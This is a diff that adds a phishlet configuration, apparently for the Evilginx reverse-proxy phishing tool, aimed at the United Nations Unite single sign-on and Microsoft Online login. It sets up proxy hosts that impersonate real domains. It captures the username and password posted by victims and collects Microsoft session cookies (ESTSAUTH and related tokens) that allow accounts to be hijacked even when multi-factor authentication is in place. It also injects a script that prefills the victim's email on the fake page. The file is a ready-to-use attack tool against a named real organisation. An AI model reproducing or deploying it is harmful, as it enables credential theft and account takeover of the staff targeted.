@@ -1,0 +1,46 @@
+name: 'un1'
+author: '@butterfly'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'sso.unite.un.org', orig_sub: 'sso.unite', domain: 'un.org', session: true, is_landing:true}
+  - {phish_sub: 'sso.unite.un.org', orig_sub: 'sso.unite', domain: 'un.org:443', session: true, is_landing:false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://login.microsoftonline.com.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://login.microsoftonline.com.{domain}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  # Uncomment and fill in if your target organization utilizes ADFS
+  - {triggers_on: 'sso.unite.un.org', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://login.microsoftonline.com.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH' , 'ESTSAUTHPERSISTENT' , 'SignInStateCookie']
+credentials:
+  username:
+    key: 'UserName'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'sso.unite.un.org'
+  path: '/adfs/ls/?client-request-id=b802b131-6c44-4bbd-822d-cd3ce998e8d0&username=&wa=wsignin1.0&wtrealm=urn%3Afederation%3AMicrosoftOnline&wctx=estsredirect%3D2%26estsrequest%3DrQIIAY2RvW_TQADFe3Fr1C4gRPcKMSGdfXd2zh8qg6nTKqRqqgNCkgXF326aO8exkxA2JsaOkA3GbCCGComNqRJS5v4FZUNMjDRiYewbfnrr-72HElaw_QD9C4ErQhRFGPrhqv2X_O7WHfypcu6efmu8gT92f767Ws6BXHJF5PEC3E-KIhvZqirK4lSIviKiKPVDjVYVXwxUMemp5wAsAVhUDKpRA2MLazrRKDGphZVAN3saDRD0Sc-Euq_psBcEIUTUCgkiHsKWcVm53XTKIiEriDydhb8rm5HIBy8zMSrmUt_1i0NXOLHrPGao0eJOJJKEUe7wGk87fArzJ_poOh7zo7LtRQcTXQwn-zW2PxuxvRZjJzOr1WkKdtDqH5W8foyP40bdjevU8dq6xapZlHlh0zQ4jGsL6UbSPkvy9fqB4BeSLLKQp8FyHfxZBx83rm2i7eGXDzuvnfeT7e9zWV272FDjwXT41DjpBt5e-_lhnlsRi188SztGmlVd8UofsnYtGZv9slt_RG18JoMzWb6SwS8ZvL219nXzBi9cbt0jCJsQmVBDO4jYyLR13P0L0'
+
+
+js_inject:
+  - trigger_domains: ["sso.unite.un.org"]
+    trigger_paths: ["/*"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#userNameInput");     
+        var password = document.querySelector("#passwordInput");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          password.focus();
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100);
